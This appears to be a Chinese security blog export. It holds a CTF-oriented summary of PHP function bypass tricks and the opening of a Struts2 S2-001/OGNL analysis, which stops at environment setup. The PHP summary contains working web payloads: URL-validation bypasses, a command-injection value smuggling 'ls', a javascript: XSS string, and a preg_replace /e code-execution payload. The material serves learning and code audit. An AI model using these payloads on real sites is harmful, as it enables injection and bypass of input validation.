base64_encode、base64_decode 同 sha1() 和 strcmp() filter_var、parse_url filter_var — 使用特定的过滤器过滤一个变量：最常见的是FILTER_VALIDATE_URL过滤器，用来判断是否是一个合法的url filter_var可能存在一些绕过： http://localhost/index.php?url=http://demo.com@sec-redclub.com http://localhost/index.php?url=http://demo.com&amp;sec-redclub.com http://localhost/index.php?url=http://demo.com?sec-redclub.com http://localhost/index.php?url=http://demo.com/sec-redclub.com http://localhost/index.php?url=http://demo.com,sec-redclub.com http://localhost/index.php?url=http://demo.com:80;sec-redclub.com:80/ http://localhost/index.php?url=http://demo.com#sec-redclub.com\t//这里的#需要换成%23 绕过parse_url函数，需要满足$site_info['host']的值以sec-redclub.com结尾，payload： http://localhost/index.php?url=demo://%22;ls;%23;sec-redclub.com:80/ 我们使用 payload ：?url=javascript://comment``％250aalert(1) ，可以执行 alert 函数： 实际上，这里的 // 在JavaScript中表示单行注释，所以后面的内容均为注释，那为什么会执行 alert 函数呢？那是因为我们这里用了字符 %0a ，该字符为换行符，所以 alert 语句与注释符 // 就不在同一行，就能执行。当然，这里我们要对 % 百分号编码成 %25 ，因为程序将浏览器发来的payload：javascript://comment``％250aalert(1) 先解码成： javascript://comment%0aalert(1) 存储在变量 $url 中（上图第二行代码），然后用户点击a标签链接就会触发 alert 函数。 strcmp int strcmp ( string $str1,string $str2) 数组跟字符串比较返回0 当输入的两个值不是字符串时就会产生非预期的返回值 &lt;?php $id=$_GET['id']; if(strcmp($secret,$id)==0){ echo 'success!'; } 绕过原理：利用strcmp函数将数组或者对象类型与字符串进行比较会返回-1，但是从5.3开始，会返回0 当传入?id[]=1时即可bypass array_search &lt;?php if(!is_array($_GET['test'])){exit();} // 判断是否为数组 $test=$_GET['test']; for($i=0;$i&lt;count($test);$i++){ //遍历数组内容，所有内容均不能为admin，类型也必须相同 if($test[$i]===\"admin\"){ echo \"error\"; exit(); } $test[$i]=intval($test[$i]); //转化为int型 } if(array_search(\"admin\",$test)===0){ echo \"flag\"; } else{ echo \"false\"; } ?&gt; 绕过原理：array_search() 函数在数组中搜索某个键值，并返回对应的键名。in_array() 函数搜索数组中是否存在指定的值。基本功能是相同的，也就是说绕过姿势也相同。利用函数接入到了不符合的类型返回“0”这个特性，直接绕过检测。所以payload：?test[]=0。 trim 去除字符串首尾处的空白字符（或者其他字符），但不会过滤过滤\\f \" \" (ASCII 32 (0x20))，普通空格符。 “\\t” (ASCII 9 (0x09))，制表符。 “ ” (ASCII 10 (0x0A))，换行符。 “\\r” (ASCII 13 (0x0D))，回车符。 “\\0” (ASCII 0 (0x00))，空字节符。 “\\x0B”(ASCII 11 (0x0B))，垂直制表符。 · \\f的意思是：换页。将当前位置移到下一页的开头。 &lt;?php $a = \" \\r\\t\\v\\0abc \\f\"; var_dump(trim($a)); ?&gt; preg_match preg_match 函数用于进行正则表达式匹配，返回 pattern 的匹配次数，它的值将是 0 次（不匹配）或 1 次，因为 preg_match() 在第一次匹配后将会停止搜索。如果在进行正则表达式匹配的时候，没有限制字符串的开始和结束(^ 和 $)，则可以存在绕过的问题 首先preg_match只能处理字符串，传入数组的时候就会返回false，因此我们可以数据绕过，例子如下 &lt;?php $pattern = '/world/'; $string = array('hello', 'world'); $result = preg_match($pattern, $string); var_dump($result); pre_match 在匹配的时候会消耗较大的资源，并且默认存在贪婪匹配，如果传入一个超长的字符串，会导致 pre_match 消耗大量资源从而导致 php 超时（一般为30s），后面的 php 语句就不会执行。 &lt;?php $code = \"hybcx###AAAAAAAAAAAAAAAAAAAAAAAA(n个A)\"; preg_match(\"/(\\d+)\\.(\\d+)\\.(\\d+)\\.(\\d+)/\", $code); ?&gt; 回溯绕过：pcre.backtrack_limit 给 pcre 设定了一个回溯次数上限，默认为1000000，如果回溯次数超过这个数字，preg_match 就会返回 false，即匹配失败，从而绕过正则匹配。 https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html &lt;?php function is_php($data){ return preg_match('/&lt;\\?.*[(`;?&gt;].*/is', $data); } if(!is_php($input)) { // fwrite($f, $input); ... } 可填入垃圾数据导致回溯次数超过了100万 preg_match 返回 FALSE 绕过判断 //bool(false) var_dump(preg_match('/&lt;\\?.*[(`;?&gt;].*/is', '&lt;?php phpinfo();//'.str_repeat('c', 1000000))); 修复方法，改用 === 判断返回值，不要只使用 if 判断 &lt;?php function is_php($data){ return preg_match('/&lt;\\?.*[(`;?&gt;].*/is', $data); } if(is_php($input) === 0) { // fwrite($f, $input); ... } %0a 换行绕过：不会匹配换行符，并且在非多行模式下，当出现换行符 %0a 的时候，会被当做两行处理，而此时只可以匹配第一行，后面的行就会被忽略。（原因其实是正则书写不当） &lt;?php $file_name = $_GET['path']; if(!preg_match(\"/^[a-zA-Z0-9-s_]+.rpt$/m\", $file_name)){ echo \"regex failed\"; }else{ echo \"flag{success}\"; } ?&gt; 注意到正则表达式结尾的/m 了，在php中，/m表示开启多行匹配模式，开启多行匹配模式之后^和$的含义就发生了变化，没开启多行模式之前(即单行匹配模式), ^ 和$ 是匹配字符串的开始和结尾，开启多行模式之后，多行模式^,$可以匹配每行的开头和结尾，所以上述payload里面含有换行符，被当做两行处理，一行匹配OK即可，else分支 preg_replace 定义：preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) : mixed 搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换 $pattern: 要搜索的模式，可以是字符串或一个字符串数组。 $replacement: 用于替换的字符串或字符串数组。 $subject: 要搜索替换的目标字符串或字符串数组。 $limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。 $count: 可选，为替换执行的次数。 常用PCRE修饰符： i (PCRE_CASELESS)：如果设置了这个修饰符，模式中的字母会进行大小写不敏感匹配 m (PCRE_MULTILINE)： “行首”元字符 (^) 和”行末”元字符 ($) 会匹配目标字符串中任意换行符之前或之后 s (PCRE_DOTALL)：点号元字符匹配所有字符，包含换行符。如果没有这个 修饰符，点号不匹配换行符。一个取反字符类比如 [^a] 总是匹配换行符，而不依赖于这个修饰符的设置。 https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php 1）/e 修饰符问题 在PHP5.5.0起废弃，php7.0.0 起不再支持 &lt;?php echo preg_replace('/test/e',$_GET['r'],'atest'); ?r=phpinfo()，获取 phpinfo https://xz.aliyun.com/t/2557 &lt;?php function complexStrtolower($regex, $value) { return preg_replace( '/(' . $regex . ')/ei', 'strtolower(\"\\\\1\")', $value ); } foreach ($_GET as $regex =&gt; $value) { echo complexStrtolower($regex, $value) . \" \"; } ?\\S*={${phpinfo()}} ，正则表达式 \\1 表示符合匹配的第一个子串，{${phpinfo()}} 使用了可变变量的知识。 2）经典写配置漏洞 https://www.leavesongs.com/PENETRATION/thinking-about-config-file-arbitrary-write.html //index.php &lt;?php $api = addslashes($_GET['api']); echo $api; $file = file_get_contents('./option.php'); $file = preg_replace(\"/define\\('API', '.*'\\);/s\", \"define('API', '{$api}');\", $file); file_put_contents('./option.php', $file); //option.php &lt;?php define('API', 'aaa\\\\'); ereg 功能同 preg_match() 类似，只不过仅在 php4，php5 中可使用，可使用 %00 截断正则匹配 tips：ereg()只能处理字符串，遇到数组做参数返回NULL //?password=123%00&amp;&amp;** //int 1 var_dump(ereg (\"^[a-zA-Z0-9]+$\", $_GET['password'])); htmlentities 一般仅仅 htmlenetities($query) 这样用，不加第二个参数的情况下，很有可能存在漏洞 htmlentities不加第二个参数的话，不会转义单引号。 注：该函数并不能转换所有的特殊字符，是转换除了空格之外的特殊字符，并且单引号和双引号需要单独控制（通过第二个参数）。第二个参数主要取值有以下三个： ENT_COMPAT（默认值） 会转换双引号，不转换单引号。 ENT_QUOTES 既转换双引号也转换单引号。 ENT_NOQUOTES 单/双引号都不转换 案例参考：PHP-Audit-Labs/README.md at master · hongriSec/PHP-Audit-Labs (github.com) （由于htmlentities运用错误，导致XSS、SQL注入） $_REQUEST 漏洞一 array_map — 为数组的每个元素应用回调函数 array_map(callable $callback,array $array1[, array $... ]):array array_map()：返回数组，是为 array1 每个元素应用 callback函数之后的数组。callback函数形参的数量和传给 array_map() 数组数量，两者必须一样。 &lt;?php $_GET = array_map('intval', $_GET); $_POST = array_map('intval', $_POST); $_COOKIE = array_map('intval', $_COOKIE); echo \"======== GET =========\".\"&lt;br/&gt;\"; var_dump($_GET); echo \"======== POST =========\".\"&lt;br/&gt;\"; var_dump($_POST); echo \"======== COOKIE =========\".\"&lt;br/&gt;\"; var_dump($_COOKIE); echo \"======== REQUEST =========\".\"&lt;br/&gt;\"; var_dump($_REQUEST); ?&gt; 可以发现 REQUEST 数据丝毫不受过滤函数的影响（意思就是GPC的数据经过过滤处理，request不会受到影响） 案例：PHP-Audit-Labs/README.md at master · hongriSec/PHP-Audit-Labs (github.com) 漏洞二 php中 REQUEST 变量默认情况下包含了 GET ，POST 和 COOKIE 的数组。在 php.ini 配置文件中，有一个参数 variables_order ，这参数有以下可选项目 这些字母分别对应的是 E: Environment ，G:Get，P:Post，C:Cookie，S:Server。这些字母的出现顺序，表明了数据的加载顺序。而 php.ini 中这个参数默认的配置是 GPCS ，也就是说如果以 POST 、 GET 方式传入相同的变量，那么用 REQUEST 获取该变量的值将为 POST 该变量的值 所有如果存在类似：$_GET传入的参数，通过$_REQUEST进行过滤，就可能存在问题 &lt;?php $get = \"GET: \".$_GET['var']; $post = \"POST: \".$_POST['var']; $request = \"REQUEST: \".$_REQUEST['var']; echo $get.\"&lt;br/&gt;\"; echo $post.\"&lt;br/&gt;\"; echo $request; ?&gt; 案例：PHP-Audit-Labs/README.md at master · hongriSec/PHP-Audit-Labs (github.com) iconv in_charset：输入的字符集。 out_charset：输出的字符集。 str：要转换的字符串。 iconv在字符串编码的时候，可能会导致字符串截断。当$str中有一个字符不能被目标字符集所表示，$str就从第一个无效字符开始截断并导致一个E_NOTICE &lt;?php $a = '1'. chr(130).'2'; echo $a.\"&lt;br/&gt;\"; echo iconv(\"UTF-8\", \"gbk\", $a); ?&gt; 不过这里我认为有版本限制，因为：5.4.0 这个版本起，字符非法时候会返回 FALSE，除非在输出字符里指定了 //IGNORE 。 在之前版本，它会返回一部分字符串。 也就是说该版本以上，基于上述例子，会直接返回false，而不是字符串 Windows FindFirstFile 将文件不可知部分之后的字符用 ‘&lt;’ 或者’&gt;’代替，只使用一个’&gt;‘只能代表一个字符，使用’&gt;&gt;’两个可以代替多个字符。可以用来进行未知文件名的文件包含，和目录爆破。 &lt;?php include ($_GET['file']); ?&gt; session反序列化 在php中session有三种序列化的方式，分别是php_serialize, php_binary和php 【在 PHP 中默认使用的是 PHP 引擎，如果要修改为其他的引擎，只需要添加代码ini_set('session.serialize_handler', '``需要设置的引擎``')``】 这里举个例子来了解一下在不同的处理器下，session所储存的格式有什么不一样(测试的时候php版本一定要大于5.5.4，不然session写不进文件))： &lt;?php ini_set('session.serialize_handler', 'php'); //ini_set('session.serialize_handler', \"php_serialize\"); //ini_set('session.serialize_handler', \"php_binary\"); session_start(); $_SESSION['hybcx'] = $_GET['a']; echo \"&lt;pre&gt;\"; var_dump($_SESSION); echo \"&lt;/pre&gt;\"; ?&gt; 这里我输出不了，直接cv了 这有什么问题，其实PHP中的Session的实现是没有的问题，危害主要是由于程序员的Session使用不当而引起的。如：使用不同处理器来处理session文件。 php引擎的存储格式是键名 | serialized_string，而php_serialize引擎的存储格式是serialized_string。如果程序使用两个引擎来分别处理的话就会出现问题。 先以php_serialize的格式存储，从客户端接收参数并存入session变量 接下来使用php处理器读取session文件 首先访问1.php，在传入的参数最开始加一个’|‘，由于1.php是使用php_serialize处理器处理，因此只会把’|‘当做一个正常的字符。然后访问2.php，由于用的是php处理器，因此遇到’|‘时会将之看做键名与值的分割符，从而造成了歧义，导致其在解析session文件时直接对’|'后的值进行反序列化处理。 这里可能会有一个小疑问，为什么在解析session文件时直接对’|'后的值进行反序列化处理，这也是处理器的功能？这个其实是因为session_start()这个函数，可以看下官方说明： 首先生成一个payload： 攻击思路中说到了因为不同的引擎会对’|‘，产生歧义，所以在传参时在payload前加个’|'，作为a参数，访问1.php,查看一下本地session文件，发现payload已经存入到session文件 弱比较 === 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较 == 在进行比较的时候，会先将字符串类型转化成相同，再比较 （1）字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值则为0 var_dump(\"admin\"==0); //true var_dump(\"1admin\"== 1); //true var_dump(\"admin1\"==0) //true （2）在进行弱类型比较时，会将0e这类字符串识别为科学技术法的数字，0的无论多少次方都是零，所以相等 var_dump(\"0e123456\"==\"0e99999\"); //true （3）当字符串当作数值来取值时，如果字符串中包含.、e、E或者数值超过整型范围内时，被当作float来取值，如果没有包含上述字符且在整形范围内，则该字符串会当作 int 来取值 $test=1 + \"10.5\"; // $test=11.5(float) $test=1+\"-1.3e3\"; //$test=-1299(float) $test=1+\"bob-1.3e3\";//$test=1(int) $test=1+\"2admin\";//$test=3(int) $test=1+\"admin2\";//$test=1(int) （4）ture 和任意字符串弱类型相等，和非 0 数字弱类型相等 var_dump(\"admin\"== true); //true var_dump(\"0admin\"== true);//true var_dump(7==true);//true var_dump(1==true);//true var_dump(0==true);//false var_dump(-7==true);//true 附上类型比较表：https://www.php.net/manual/zh/types.comparisons.php &lt;?php var_dump(\"123.a1bc\"==123);//true var_dump(\"123ea1bc\"==123);//true var_dump(\"123Ea1bc\"==123);//true //上面都是true，有什么区别吗，其实这上面是没有什么区别，和前面说到的一样，将字符串开始部分从数字连续取到非数字截止 //那看看下面这几个代码 var_dump(\"123.2abc\"==123);//false var_dump(\"123.2abc\"==1232);//false var_dump(\"123e2abc\"==123);//false vardump(\"123E2abc\"==123);//false //开始部分存在数字，若连续的数字中包含.或e或E会干扰字符串和数字的比较，因为.就表示了浮点数，e和E表示了科学计数法，只要字符串中包含这些，上面所说的比较就不能理想地实现 var_dump('root' == 0); //true//分析：先将字符串root转化成和0同等类型即数字型，因为字符串开始没有合法数值，则字符串root转换为0，最后0==0,所以成立。 var_dump(0 == 'root'); //true//分析：先将字符串root转化成和0同等类型即数字型，因为字符串开始没有合法数值，则字符串root转换为0，最后0==0,所以成立。 var_dump('22root' == 22); //true//分析：先将字符串22root转化成和0同等类型即数字型，因为字符串开始有合法数值，则取其连续的合法数值22，最后22==22，所以成立。 var_dump('22r22oot' == 22); //true//分析：先将字符串22r22oot转化成和0同等类型即数字型，因为字符串开始有合法数值，则取其连续的合法数值22，r后面的22因为与开始的合法数值不连续，所以不取它的值，22==22，所以成立。 var_dump('root22' == 22); //false//分析：先将字符串root22转化成和0同等类型即数字型，因为字符串开始没有合法数值，则字符串root22转换为0，最后0==22,所以不成立。 var_dump('root22' == 0); //true//分析：先将字符串root22转化成和0同等类型即数字型，因为字符串开始没有合法数值，则字符串root22转换为0，最后0==0,所以成立。 var_dump('0e170' == '0e180'); //true//分析：因为字符串中含有e开头的值，那么php代码会将其整体看成科学记数法，最后0的170次方==0的180次方，即0==0,所以成立 var_dump(0 === 'root'); //false//分析：=== 在进行比较的时候，会先判断两边类型是否相等,这里数值和字符串类型明显不等，因此不成立 var_dump (\"0e830400451993494058024219903391\" == 0); //true//分析：先将字符串0e830400451993494058024219903391转化成和0同等类型即数字型，因为字符串开始有合法数值，则字符串0e830400451993494058024219903391转换为0，最后0==0,所以成立。 var_dump (\"0e830400451993494058024219903391\" == \"0e830400451993494058024219904444\"); //true//分析：先将字符串0e830400451993494058024219903391与0e830400451993494058024219904444分别转化成数字型，因为两个字符串开始都有合法数值，则字符串0e830400451993494058024219903391转换为0，字符串0e830400451993494058024219904444转换为0，最后0==0,所以成立。 var_dump (0e830400451993494058024219903391 == 0e830400451993494058024219904444); //true//分析：这不是字符串的比较了，这是数字型的比较，因为==两边的都是科学记数法0e（0的次方），最终0=0 ?&gt; json_decode &lt;?php show_source(__FILE__); if (isset($_POST['message'])) { $message = json_decode($_POST['message']); $key =\"*********\"; if ($message-&gt;key == $key) { echo \"flag\"; } else { echo \"fail\"; } } else{ echo \"~~~~\"; } ?&gt; 运用 bool 欺骗，json_decode 将 key 值解析为 bool 类型的 false，payload message={\"key\":0}，0与字符串进行弱比较，肯定是true intval intval() 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。tips：在转换时，函数会从字符串起始处进行转换直到遇到一个非数字的字符，即使出现无法转换的字符串也不会报错而是返回0，从而可以导致如下情形的Bypass 注： intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1（注意这个通常配合preg_match来使用） int intval ( mixed $var [, int $base = 10 ] ) 参数说明： $var：要转换成 integer 的数量值。 $base：转化所使用的进制。 如果 base为空，通过检测 var 的格式来决定使用的进制： 如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)； 否则，如果字符串以 “0” 开始，使用 8 进制(octal)； 否则，将使用 10 进制 (decimal)。 &lt;?php $a = $_GET['a']; if (intval($a) === 666) { $sql = \"Select a From Table Where Id=\".$a; echo $sql; } else { echo \"No...\"; } ?&gt; srand/mt_srand 语法：srand(seed) 和 mt_srand(seed) 自 PHP 4.2.0 起，不再需要用 srand() 或 mt_srand() 给随机数发生器播种 ，因为现在是由系统自动完成的。但他却有个特性就是 当设置好种子后 再通过mt_rand()生成出来的随机数将会是固定的。 https://mp.weixin.qq.com/s/nVqkiMXyg2D_HtwLTkSgMA (double)microtime() 只有6位有效数字，种子取值0,10,20,30,40,50,60,70,80,90,100~9999980,9999990 共100W，种子固定，生成的随机数固定即生成的随机字符串固定，导致可爆破 is_numeric is_numeric()函数来判断变量是否为数字，是数字返回1，不是则返回0。比较范围不局限于十进制数字。 &lt;?php error_reporting(0); $flag = \"flag{test}\"; $temp = $_GET['password']; is_numeric($temp)?die(\"no numeric\"):NULL; if($temp&gt;1336){ echo $flag; } ?&gt; 绕过：?password=1337a或者?password=1337%00 16进制会被判断为数字 %00即空格会被判断为非数字 16进制绕过：is_numeric() 会对「16进制」（0x开头）返回 true 。数值型和字符型都可以。 var_dump(is_numeric(0x7e)); //bool(true) var_dump(is_numeric('0x7e')); //bool(true) 绕过思路：把 '1 or 1' 这类payload转成16进制，再传给 is_numeric() ，实现绕过。 科学计数法绕过：is_numeric() 会对「科学计数法」（0e开头）返回 true 。数值型和字符型都可以。并且，0e开头的值，强制转换成int类型后，都是1。 var_dump(is_numeric(0e123)); //bool(true) var_dump(is_numeric('0e123')); //bool(true) echo (int)is_numeric(0e123).PHP_EOL; //1 echo (int)is_numeric(0e9999).PHP_EOL; //1 echo (int)is_numeric('0e123'); //1 绕过思路：遇到 (int)is_numeric($_GET['a']) 这类情况时，可以使用传入 0exxx 格式的参数来绕过。 字符串：「数字」和「字母」组合的字符串，无论是否以数字开头，都返回 false。 var_dump(is_numeric('1a')); //bool(false) var_dump(is_numeric('a1')); //bool(false) is_int()和is_numeric()的区别 is_int() 和 is_numeric() 都可以 “判断变量是否为数字”。 但 is_int() 必须是「整形」才返回 true ，其他类型都返回 false； 而 is_numeric() 对「浮点型」 和「数值型字符串」也返回 true 。 var_dump(is_numeric(1.1)); //bool(true) var_dump(is_int(1.1)); //bool(false) var_dump(is_numeric('1')); //bool(true) var_dump(is_int('1')); //bool(false) type_digit()和is_numeric()的区别 type_digit() 和 is_numeric() 都可以 “判断变量是否为数字”。 但 type_digit() 只有在字符串中全是「数字」才会返回 true ，整型、浮点型、甚至包含正负符号的值都返回 false。 而 is_numeric() 对整型、浮点型、以及包含正负符号的值都返回 true 。 var_dump(is_numeric('1')); //bool(true) var_dump(ctype_digit('1')); //bool(true) var_dump(is_numeric(1)); //bool(true) var_dump(ctype_digit(1)); //bool(false) var_dump(is_numeric('1.1')); //bool(true) var_dump(ctype_digit('1.1')); //bool(false) var_dump(is_numeric('-1')); //bool(true) var_dump(ctype_digit('-1')); //bool(false) var_dump(is_numeric('+1')); //bool(true) var_dump(ctype_digit('+1')); //bool(false) strpos strpos() 函数查找字符串在另一字符串中第一次出现的位置（区分大小写）。(函数返回查找到这个find字符串的位置，那么如果是0位置，就值得注意了) **注释：**strpos() 函数是区分大小写的。 strpos(string,find,start) 参数 描述 string 必需。规定被搜索的字符串。 find 必需。规定要查找的字符。 start 可选。规定开始搜索的位置 可以数组绕过 &lt;?php $flag = \"flag\"; if (isset ($_GET['ctf'])) { if (@ereg (\"^[1-9]+$\", $_GET['ctf']) === FALSE) echo '必须输入数字才行'; else if (strpos ($_GET['ctf'], '#biubiubiu') !== FALSE) die('Flag: '.$flag); else echo '骚年，继续努力吧啊~'; } ?&gt; strpos()遇到数组，返回NULL，与FALSE类型不同，if条件成立 不过有的说还可以%0a换行绕过，但我暂时没找到例子（应用场景），只是有个demo &lt;?php $flag = \"flag{success}\"; $i='666'; $ii=$_GET['h']; if(strpos($ii,$i,\"0\")){ echo $flag; } ?&gt; 文件包含 PHP中提供了四个文件包含的函数，分别是include()、include_once()、require()和require_once()。这四个函数都可以进行文件包含，但作用并不一样。 - include：找不到被包含的文件时只会产生警告，脚本将继续执行。 - include_once：和include()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。 - require：找不到被包含的文件时会产生致命错误，并停止脚本。 - require_once：和require()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。 0x08 参考文章 PHP函数漏洞总结 ——含有文件包含bypass，绕过require_once 单次包含限制 https://github.com/hongriSec/PHP-Audit-Labs ——红日代码审计靶场 preg_replace /e 模式 漏洞分析总结 PHP代码审计之PHP危险函数总结 浅谈CTF中各种花式绕过的小trick CTF——Web——php 弱类型总结 PHP CTF常见考题的绕过技巧 关于 CTF 中 php 考点与绕过那些事的总结 PHP is_numeric()函数详解，PHP判断变量是否为数字或数字字符串，is_numeric()绕过","tags":["web知识总结"],"categories":["web知识总结"]},{"title":"Java反序列化入门之S2-001分析","path":"/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/","content":"0x01 前言 跟着师傅的指导，再来看看Structs2的漏（最近hvv也一直背的面经）。最近学习路上总是emo，发现自己以前学的不扎实，而且串联不起来，很混乱，目前还没找到解决的办法，只能说，先认真对待当下的每一次所学习的东西。日后在整理一下思绪。 0x02 概述 自 Struts2 在 2007 年爆出第一个远程代码执行漏洞 S2-001 以来，在其后续的发展过程中不断爆出更多而且危害更大的远程代码执行漏洞，而造成 Struts2 这么多 RCE 漏洞的主要原因就是 OGNL 表达式。这里以 Struts2 的第一个漏洞 S2-001 为例来对 Struts2 远程代码执行漏洞进行学习 在这之前，也是简单过了一下Java se等基础，希望接下来分析能够顺利些 0x03 前置知识 OGNL 简介 首先来了解 OGNL 表达式，OGNL（Object Graphic Navigatino Language）的中文全称为“对象图导航语言”，是应用于Java中的一个开源的功能强大的表达式语言（Expression Language），它被集成在Struts2等框架中，通过简单一致的表达式语法，可以存取对象的任何属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。 OGNL进行对象存取操作的API在Ognl.java文件中，分别是getValue、setValue两个方法。getValue通过传入的OGNL表达式，在给定的上下文环境中，从root对象里取值： 创建一个Student类 public class Student { private String name; private String StudentNumber; private TheClass theClass; public String getName() { return name; } public void setName(String name) { this.name = name; } public String getStudentNumber() { return StudentNumber; } public void setStudentNumber(String studentNumber) { StudentNumber = studentNumber; } public TheClass getTheClass() { return theClass; } public void setTheClass(TheClass theClass) { this.theClass = theClass; } } 定义一个School类 public class School { private String schoolName; public String getSchoolName() { return schoolName; } public void setSchoolName(String schoolName) { this.schoolName = schoolName; } } 最后一个TheClass类 public class TheClass { private String className; private School school; public String getClassName() { return className; } public void setClassName(String className) { this.className = className; } public School getSchool() { return school; } public void setSchool(School school) { this.school = school; } } 分别定义相应的属性，并设置get、set方法 之后添加ognl jar包作为相应的库，随后在定义一个TestOgnl类 import ognl.Ognl; import ognl.OgnlException; public class TestOgnl { public static void main(String[] args) throws OgnlException { Student student = new Student(); TheClass theClass = new TheClass(); School school = new School(); school.setSchoolName(\"一中\"); theClass.setSchool(school); theClass.setClassName(\"三班\"); student.setName(\"hybcx\"); student.setStudentNumber(\"003\"); student.setTheClass(theClass); String schoolName = (String) Ognl.getValue(\"#root.theClass.school.schoolName\", student); System.out.println(schoolName); } } 分别给对应的属性赋值，接着我们是想要获取到其中的schoolName属性值 我们可以与传统的方法比较一下，如果想要获取schoolName属性值，就需要实例化对应类，然后调用get方法。但如果使用ognl的getValue方法，就只需要传递一个ognl表达式和根节点就能取出指定对象的属性值。 OGNL 三要素 OGNL具有三要素：表达式（expression）、根对象（root）和上下文对象（context）。 表达式（expression）：表达式是整个OGNL的核心，通过表达式来告诉OGNL需要执行什么操作； 根对象（root）：root可以理解为OGNL的操作对象，OGNL可以对root进行取值或写值等操作，表达式规定了“做什么”，而根对象则规定了“对谁操作”。实际上根对象所在的环境就是 OGNL 的上下文对象环境； 上下文对象（context）：context可以理解为对象运行的上下文环境，context以MAP的结构、利用键值对关系来描述对象中的属性以及值； 这样不难知道，OGNL的context是包含root的。 Struts2中的ActionContext即为OGNL的context（又称context map），其中包含的ValueStack即为OGNL的root。该ActionContext包含的对象如图： ValueStack 值栈（ValueStack）就是OGNL表达式存取数据的地方。在一个值栈中，封装了一次请求所需要的所有数据。 在使用Struts2的项目中，Struts2会为每个请求创建一个新的值栈，也就是说，值栈和请求是一一对应的关系，这种一一对应的关系使值栈能够线程安全地为每个请求提供公共的数据存取服务。 值栈的作用 值栈可以作为一个数据中转站在前台与后台之间传递数据，最常见的就是将Struts2的标签与OGNL表达式结合使用。值栈实际上是一个接口，在Struts2中利用OGNL时，实际上使用的就是实现了该接口的OgnlValueStack类，这个类是OGNL的基础。 值栈贯穿整个Action的生命周期，每个Action类的对象实例都拥有一个ValueStack对象，在ValueStack对象中保存了当前Action对象和其他相关对象。 要获取值栈中存储的数据，首先应该获取值栈。值栈的获取有两种方式，具体如下。 request中获取值栈 ValueStack对象在request范围内的存储方式为request.setAttribute(\"struts.valueStack\",valuestack)，可以通过如下方式从request中取出值栈的信息。 //获取 ValueStack 对象，通过 request 对象获取 ValueStack valueStack = (ValueStack)ServletActionContext.getRequest() .getAttribute(ServletActionContext.STRUTS_VALUESTACK_KEY); 在上述示例代码中，ServletActionContext.STRUTS_VALUESTACK_KEY是ServletActionContext类中的常量，它的值为struts.valueStack。 ActionContext中获取值栈 在使用Struts2框架时，可以使用OGNL操作Context对象从ValueStack中存取数据，也就是说，可以从Context对象中获取ValueStack对象。实际上，Struts2框架中的Context对象就是ActionContext。 ActionContext获取ValueStack对象的方式如下所示： //通过 ActionContext 获取 valueStack 对象 ValueStack valueStack = ActionContext.getContext().getValueStack(); ActionContext对象是在StrutsPrepareAndExcuteFilter的doFilter()方法中被创建的，在源码中用于创建ActionContext对象的createActionContext()方法内可以找到获取的ValueStack对象的信息。 方法中还有这样一段代码： ctx = new ActionContext(stack.getContext()); 从上述代码中可以看出，ValueStack对象中的Context对象被作为参数传递给了ActionContext对象，这也就说明ActionContext对象中持有了ValueStack对象的引用，因此可以通过ActionContext对象获取ValueStack对象。 Struts2 执行流程 首先来简单了解 Struts2 的执行流程。官方提供的 Struts2 的架构如图： 在该图中，一共给出了四种颜色的标识，其对应的意义如下。 Servlet Filters(橙色)：过滤器，所有的请求都要经过过滤器的处理。 Struts Core(浅蓝色)：Struts2的核心部分。 Interceptors(浅绿色)：Struts2的拦截器。 User created(浅黄色)：需要开发人员创建的部分。 图中的一些组件的作用如下： FilterDispatcher：是整个Struts2的调度中心，也就是整个MVC架构中的C，它根据ActionMapper的结果来决定是否处理请求。 ActionMapper：用来判断传入的请求是否被Struts2处理，如果需要处理的话，ActionMapper就会返回一个对象来描述请求对应的ActionInvocation的信息。 ActionProxy：用来创建一个ActionInvocation代理实例，它位于Action和xwork之间。 ConfigurationManager：是xwork配置的管理中心，可以把它当做已经读取到内存中的struts.xml配置文件。 struts.xml：是Stuts2的应用配置文件，负责诸如URL与Action之间映射的配置、以及执行后页面跳转的Result配置等。 ActionInvocation：用来真正的调用并执行Action、拦截器和对应的Result，作用类似于一个调度器。 Interceptor：拦截器，可以自动拦截Action，主要在Action运行之前或者Result运行之后来进行执行，开发者可以自定义。 Action：是Struts2中的动作执行单元。用来处理用户请求，并封装业务所需要的数据。 Result：是不同视图类型的抽象封装模型，不同的视图类型会对应不同的Result实现，Struts2中支持多种视图类型，比如Jsp，FreeMarker等。 Templates：各种视图类型的页面模板，比如JSP就是一种模板页面技术。 Tag Subsystem：Struts2的标签库，它抽象了三种不同的视图技术JSP、velocity、freemarker，可以在不同的视图技术中，几乎没有差别的使用这些标签。 接下来我们可以结合上图，来了解下Struts2框架是如何处理一个HTTP请求的。 当HTTP请求发送到Web服务器之后，Web服务器根据用户的请求以及web.xml中的配置文件，将请求转发给Struts2框架进行处理。 HTTP请求经过一系列的过滤器，最后到达FilterDispatcher过滤器。 FilterDispatcher将请求转发给ActionMapper，判断该请求是否需要处理。 如果该请求需要处理，FilterDispatcher会创建一个ActionProxy来进行后续的处理。 ActionProxy拿着HTTP请求，询问struts.xml该调用哪一个Action进行处理。 当知道目标Action之后，实例化一个ActionInvocation来进行调用。 然后运行在Action之前的拦截器，图中就是拦截器1、2、3。 运行Action，生成一个Result。 Result根据页面模板和标签库，生成要响应的内容。 根据响应逆序调用拦截器，然后生成最终的响应并返回给Web服务器。 0x04 漏洞分析 官方公告：https://cwiki.apache.org/confluence/display/WW/S2-001 漏洞影响范围：WebWork 2.2.0-WebWork 2.2.5，Struts 2.0.0-Struts 2.0.8 S2-001的漏洞原理是模板文件（JSP）中引用了不合适的标签进行渲染，并且渲染的值是用户可控的，此时则达成了表达式注入的目的。 漏洞环境搭建 Apache Tomcat/8.5.46+struts2（这个插件最新版） 